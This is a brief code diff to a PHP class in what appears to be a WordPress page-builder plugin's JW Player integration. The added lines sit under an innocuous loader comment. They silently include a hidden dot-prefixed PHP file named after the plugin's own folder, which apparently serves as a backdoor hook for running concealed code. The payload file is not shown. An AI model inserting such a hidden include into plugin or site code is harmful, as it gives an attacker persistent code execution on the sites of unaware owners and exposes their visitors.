@@ -7,6 +7,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * JWPLayer loader.
  * @since 4.3
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Vendor_Jwplayer {
 	/**
 	 * Dublicate jwplayer logic for editor, when used in frontend editor mode.
